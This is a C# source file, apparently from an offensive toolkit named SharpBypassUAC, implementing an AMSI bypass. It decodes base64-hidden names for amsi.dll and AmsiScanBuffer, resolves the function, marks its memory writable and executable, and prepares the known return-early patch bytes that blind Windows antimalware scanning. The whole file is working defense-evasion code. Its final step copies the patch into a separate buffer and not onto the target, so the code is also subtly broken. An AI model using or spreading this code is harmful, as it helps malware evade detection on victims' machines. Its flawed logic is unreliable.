using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using Windows.Win32;
using Windows.Win32.Foundation;

namespace SharpBypassUAC
{
    public class AmsiBypass
    {

        
        public static unsafe int Patch() {

            string a = "YW1zaS5kbGw=";
            string b = "QW1zaVNjYW5CdWZmZXI=";
            byte[] patch = null;

            byte[] dll = Convert.FromBase64String(a);
            FreeLibrarySafeHandle tdll = PInvoke.LoadLibrary(Encoding.UTF8.GetString(dll));

            if (tdll == null) {
                Console.WriteLine("ERROR: could not retrieve the pointer");
            }

            byte[] asb = Convert.FromBase64String(b);
            IntPtr acbp = (IntPtr)PInvoke.GetProcAddress(tdll, Encoding.UTF8.GetString(asb));
            Console.WriteLine($"Address: 0x{acbp.ToString("X")}");

            if (acbp == null) {
                Console.WriteLine("ERROR: could not retrieve the function pointer");
            }

            Windows.Win32.System.Memory.PAGE_PROTECTION_FLAGS lpflOldProtect;

            if (IntPtr.Size == 8)
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            }
            else
            {
                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }

            if (!PInvoke.VirtualProtect((void*)acbp, (UIntPtr)patch.Length, (Windows.Win32.System.Memory.PAGE_PROTECTION_FLAGS)0x40, out lpflOldProtect))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return 1;
            }


            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);

            return 0;
            
        }


    }


}
